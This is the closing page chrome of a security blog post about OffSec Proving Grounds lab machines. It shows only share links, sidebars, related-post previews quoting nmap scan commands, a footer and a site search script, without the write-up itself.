fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OffSec%20PG%20-%20NoName,%20SoSimple,%20OnSystemShellDread,%20Photographer%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set5%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set5%2F&text=OffSec%20PG%20-%20NoName,%20SoSimple,%20OnSystemShellDread,%20Photographer%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set5%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/go-tui/">Building a Terminal UI for Go CLI Tools</a><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-notif/">Custom GitHub WebHook Notifications via GitHub Actions</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-npm/">Reverse Proxy in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/go-coding/">The Way to Go(lang)</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgetlord/">Expense Tracking in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/oscp-pg-set6/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Potato, PyExp, Sar, Seppukku</h4><div class="text-muted"><p>Potato Enumeration Machine IP → 192.168.53.101 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set4/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Katana, Lampiao, Loly, Monitoring</h4><div class="text-muted"><p>Katana Enumeration Machine IP → 192.168.51.83 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83 OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set3/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness</h4><div class="text-muted"><p>Gaara Enumeration Machine IP → 192.168.208.142 Network Scan Nmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/oscp-pg-set4/" class="btn btn-outline-primary" aria-label="Older" ><p>OffSec PG - Katana, Lampiao, Loly, Monitoring</p></a> <a href="/blog/posts/oscp-pg-set6/" class="btn btn-outline-primary" aria-label="Newer" ><p>OffSec PG - Potato, PyExp, Sar, Seppukku</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
